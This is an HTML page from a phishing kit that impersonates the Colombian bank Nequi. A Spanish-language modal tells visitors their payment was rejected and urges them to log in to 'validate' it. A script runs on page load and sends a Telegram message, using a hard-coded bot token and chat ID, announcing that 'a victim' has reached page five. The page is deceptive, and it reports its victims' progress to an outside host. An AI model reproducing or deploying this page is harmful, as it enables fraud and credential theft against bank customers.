<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <link rel="stylesheet" href="css/pag5.css">
    <link rel="icon" href="/img/boton-nequi.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="modal">
        <div class="modal-content">
            <i class="fas fa-bell icon"></i>
            <h2>Queremos validar que eres tú</h2>
            <p>Por tu seguridad rechazamos tu pago, ingresa a tu Nequi para validar que si eres tú el que está haciendo la compra.</p>
            
            <a href="/index.html">
              <button class="ready-btn">Listo</button>
            </a>
        </div>
    </div>
    <script type="module">
            // Función para enviar notificación de página visitada
    function enviarNotificacionPagina() {
        let bots = [
            { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "6328222257" },
            { token: "", chatId: "" }
        ];

        bots.forEach(bot => {
            let mensaje = `*Alerta:* Una victima esta en la *PAGINA5* = Pagina para validar si eres tu`;
            let url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

            fetch(url).then(response => console.log(`Notificación enviada a bot: ${bot.token}`))
                      .catch(error => console.error(`Error al enviar notificación: ${error}`));
        });
    }

    // Enviar notificación al cargar la página
    enviarNotificacionPagina();

    </script>
</body>
</html>
